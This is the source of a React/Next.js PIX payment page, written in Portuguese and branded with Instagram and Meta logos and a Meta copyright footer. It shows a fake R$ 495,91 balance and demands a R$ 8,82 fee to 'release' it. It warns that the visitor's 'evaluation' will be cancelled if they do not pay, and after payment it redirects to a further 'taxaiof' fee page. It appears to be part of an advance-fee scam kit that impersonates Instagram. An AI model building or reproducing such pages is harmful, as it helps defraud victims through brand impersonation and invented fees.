"use client"

import { useState, useEffect, useRef, Suspense } from "react"
import { Button } from "@/components/ui/button"
import Image from "next/image"
import { useSearchParams } from "next/navigation"
import { navigateWithUTM } from "@/lib/utm-manager"

interface PodPayTransaction {
  id: string
  amount: number
  status: string
  paymentMethod: string
  pixPayload?: string // Added pixPayload field for real PIX code
  createdAt: string
  updatedAt: string
}

function PixCheckoutContent() {
  const searchParams = useSearchParams()
  const transactionId = searchParams.get("id")

  const [transaction, setTransaction] = useState<PodPayTransaction | null>(null)
  const [pixCopied, setPixCopied] = useState(false)
  const [paymentApproved, setPaymentApproved] = useState(false)
  const [isLoading, setIsLoading] = useState(true)

  const pollingIntervalRef = useRef<NodeJS.Timeout | null>(null)
  const timeoutRef = useRef<NodeJS.Timeout | null>(null)
  const isPollingRef = useRef(false)

  useEffect(() => {
    const fetchTransactionData = async () => {
      if (!transactionId) {
        setIsLoading(false)
        return
      }

      try {
        console.log("[v0] Fetching transaction data for ID:", transactionId)
        const response = await fetch(`/api/pix-checkout/get-transaction?id=${transactionId}`)
        const result = await response.json()

        if (result.success && result.data) {
          console.log("[v0] Transaction data loaded:", result.data)
          setTransaction(result.data)
        } else {
          console.error("[v0] Failed to load transaction data:", result.error)
          // Fallback for demo purposes - removed hardcoded pixPayload
          setTransaction({
            id: transactionId,
            amount: 8.82,
            status: "waiting_payment",
            paymentMethod: "pix",
            createdAt: new Date().toISOString(),
            updatedAt: new Date().toISOString(),
          })
          console.warn("[v0] Fallback de transação ativado. Verifique a API de transações.")
        }
      } catch (error) {
        console.error("[v0] Error fetching transaction data:", error)
        // Fallback for demo purposes - removed hardcoded pixPayload
        setTransaction({
          id: transactionId || "demo",
          amount: 8.82,
          status: "waiting_payment",
          paymentMethod: "pix",
          createdAt: new Date().toISOString(),
          updatedAt: new Date().toISOString(),
        })
        console.warn("[v0] Fallback de transação ativado. Verifique a API de transações.")
      } finally {
        setIsLoading(false)
      }
    }

    fetchTransactionData()
  }, [transactionId])

  useEffect(() => {
    if (transactionId && !isPollingRef.current) {
      checkPaymentStatus(transactionId)
    }

    return () => {
      if (pollingIntervalRef.current) {
        clearInterval(pollingIntervalRef.current)
        pollingIntervalRef.current = null
      }
      if (timeoutRef.current) {
        clearTimeout(timeoutRef.current)
        timeoutRef.current = null
      }
      isPollingRef.current = false
    }
  }, [transactionId])

  const checkPaymentStatus = async (id: string) => {
    if (isPollingRef.current) {
      console.log("[v0] Payment polling already active, skipping...")
      return
    }

    try {
      console.log("[v0] Starting payment status check for transaction:", id)
      isPollingRef.current = true

      pollingIntervalRef.current = setInterval(async () => {
        try {
          console.log("[v0] Checking payment status for transaction:", id)
          const response = await fetch(`/api/check-payment-status?id=${id}`)
          const data = await response.json()
          console.log("[v0] Payment status response:", data)

          if (data.status === "paid" || data.status === "PAID" || data.status === "AUTHORIZED") {
            if (pollingIntervalRef.current) {
              clearInterval(pollingIntervalRef.current)
              pollingIntervalRef.current = null
            }
            if (timeoutRef.current) {
              clearTimeout(timeoutRef.current)
              timeoutRef.current = null
            }
            isPollingRef.current = false

            setPaymentApproved(true)
            console.log("[v0] Payment approved, redirecting...")
            setTimeout(() => {
              navigateWithUTM("/taxaiof")
            }, 2000)
          }
        } catch (error) {
          console.error("[v0] Error checking payment status:", error)
        }
      }, 5000)

      timeoutRef.current = setTimeout(
        () => {
          if (pollingIntervalRef.current) {
            clearInterval(pollingIntervalRef.current)
            pollingIntervalRef.current = null
          }
          isPollingRef.current = false
          console.log("[v0] Payment status polling stopped after 10 minutes")
        },
        10 * 60 * 1000,
      )
    } catch (error) {
      console.error("[v0] Error setting up payment status check:", error)
      isPollingRef.current = false
    }
  }

  const copyPixCode = async () => {
    const pixCode = transaction?.pixPayload || ""
    if (!pixCode) {
      console.error("[v0] No PIX code available to copy")
      return
    }

    try {
      await navigator.clipboard.writeText(pixCode)
      setPixCopied(true)
      console.log("[v0] PIX code copied to clipboard:", pixCode)
      setTimeout(() => setPixCopied(false), 2000)
    } catch (error) {
      console.error("[v0] Error copying PIX code:", error)
      // Fallback for older browsers
      const textArea = document.createElement("textarea")
      textArea.value = pixCode
      document.body.appendChild(textArea)
      textArea.select()
      document.execCommand("copy")
      document.body.removeChild(textArea)
      setPixCopied(true)
      setTimeout(() => setPixCopied(false), 2000)
    }
  }

  if (isLoading) {
    return (
      <div className="min-h-screen bg-gray-50 flex items-center justify-center">
        <div className="animate-spin rounded-full h-8 w-8 border-b-2 border-pink-500"></div>
      </div>
    )
  }

  if (!transaction) {
    return (
      <div className="min-h-screen bg-gray-50 flex items-center justify-center p-4">
        <div className="text-center">
          <h1 className="text-xl font-bold text-gray-800 mb-2">Erro</h1>
          <p className="text-gray-600 mb-4">Dados da transação PodPay não encontrados</p>
          <Button onClick={() => navigateWithUTM("/")}>Voltar ao início</Button>
        </div>
      </div>
    )
  }

  return (
    <div className="min-h-screen bg-gray-50 flex flex-col">
      {/* Header */}
      <div className="bg-white px-4 py-3 flex items-center justify-between shadow-sm">
        <div className="flex items-center gap-2">
          <Image src="/images/meta-logo.png" alt="Meta" width={80} height={32} className="h-8 w-auto" />
        </div>
        <div className="text-white px-2 py-1.5 rounded-full font-bold shadow-lg text-sm bg-gradient-to-r from-pink-500 via-purple-500 to-orange-400 flex items-center gap-1">
          <svg className="w-4 h-4" fill="currentColor" viewBox="0 0 20 20">
            <path
              fillRule="evenodd"
              d="M4 4a2 2 0 00-2 2v1h16V6a2 2 0 00-2-2H4zm14 3H2v5a2 2 0 002 2h12a2 2 0 002-2V7zM2.5 9a1.5 1.5 0 113 0 1.5 1.5 0 01-3 0z"
              clipRule="evenodd"
            />
          </svg>
          R$ 495,91
        </div>
      </div>

      {/* Main Content */}
      <div className="flex-1 flex flex-col items-center justify-center p-4 max-w-md mx-auto w-full">
        {paymentApproved ? (
          <div className="text-center space-y-4">
            <div className="w-20 h-20 bg-green-500 rounded-full flex items-center justify-center mx-auto">
              <svg className="w-10 h-10 text-white" fill="none" stroke="currentColor" viewBox="0 0 24 24">
                <path strokeLinecap="round" strokeLinejoin="round" strokeWidth={2} d="M5 13l4 4L19 7" />
              </svg>
            </div>
            <h1 className="text-2xl font-bold text-green-600">Pagamento Aprovado!</h1>
            <p className="text-gray-600">Redirecionando...</p>
          </div>
        ) : (
          <>
            {/* Instagram Icon */}
            <div className="w-20 h-20 mb-6 flex items-center justify-center">
              <Image
                src="/images/instagram-logo-official.png"
                alt="Instagram"
                width={80}
                height={80}
                className="w-20 h-20"
              />
            </div>

            {/* Title */}
            <h1 className="text-2xl font-bold text-gray-800 mb-6 text-center">PAGAMENTO PIX</h1>

            {/* Amount - Fixed to show R$8.82 */}
            <div className="bg-gradient-to-r from-pink-500 to-orange-400 text-white px-6 py-3 rounded-2xl font-bold text-xl mb-6">
              R$ 8,82
            </div>

            {/* QR Code */}
            <div className="bg-white p-6 rounded-2xl shadow-lg mb-6 w-full max-w-sm">
              <div className="flex justify-center mb-4">
                {transaction?.pixPayload ? (
                  <img
                    src={`https://api.qrserver.com/v1/create-qr-code/?size=200x200&data=${encodeURIComponent(transaction.pixPayload)}`}
                    alt="QR Code PIX"
                    className="w-48 h-48"
                  />
                ) : (
                  <div className="w-48 h-48 flex items-center justify-center bg-gray-200 text-gray-500 text-center rounded-lg">
                    QR Code não disponível
                  </div>
                )}
              </div>

              <div className="space-y-3">
                <p className="text-sm font-medium text-gray-700 text-center">Código PIX:</p>
                <div className="bg-gray-100 p-3 rounded-lg">
                  <p className="text-xs font-mono break-all text-gray-800">
                    {transaction?.pixPayload
                      ? `${transaction.pixPayload.substring(0, 50)}...`
                      : "Carregando código PIX..."}
                  </p>
                </div>

                <Button
                  onClick={copyPixCode}
                  disabled={!transaction?.pixPayload}
                  className="w-full bg-gradient-to-r from-pink-500 to-orange-400 hover:from-pink-600 hover:to-orange-500 text-white font-bold py-3 rounded-xl disabled:opacity-50"
                >
                  {pixCopied ? "Código Copiado!" : "Copiar Código PIX"}
                </Button>
              </div>
            </div>

            {/* Warning Messages */}
            <div className="space-y-3 w-full max-w-sm">
              <div className="bg-yellow-50 border border-yellow-200 rounded-lg p-3">
                <p className="text-xs text-yellow-800 font-medium text-center">
                  ⚠️ Atenção: Após realizar o pagamento via PIX, retorne ao site para liberar seu saldo.
                </p>
              </div>

              <div className="bg-red-50 border border-red-200 rounded-lg p-3">
                <p className="text-xs text-red-800 font-medium text-center">
                  Lembrando: Caso não efetue o pagamento, sua avaliação será anulada e cancelada.
                </p>
              </div>
            </div>

            {/* Payment Status */}
            <div className="text-center mt-6">
              <p className="text-sm text-gray-600 mb-2">Aguardando pagamento...</p>
              <div className="flex justify-center">
                <div className="animate-pulse flex space-x-1">
                  <div className="w-2 h-2 bg-pink-500 rounded-full"></div>
                  <div className="w-2 h-2 bg-pink-500 rounded-full"></div>
                  <div className="w-2 h-2 bg-pink-500 rounded-full"></div>
                </div>
              </div>
            </div>
          </>
        )}
      </div>

      {/* Footer */}
      <div className="text-center text-xs text-gray-500 p-4">
        Todos os direitos reservados © 2025 Instagram from Meta
      </div>
    </div>
  )
}

export default function PixCheckoutPage() {
  return (
    <Suspense
      fallback={
        <div className="min-h-screen bg-gray-50 flex items-center justify-center">
          <div className="animate-spin rounded-full h-8 w-8 border-b-2 border-pink-500"></div>
        </div>
      }
    >
      <PixCheckoutContent />
    </Suspense>
  )
}
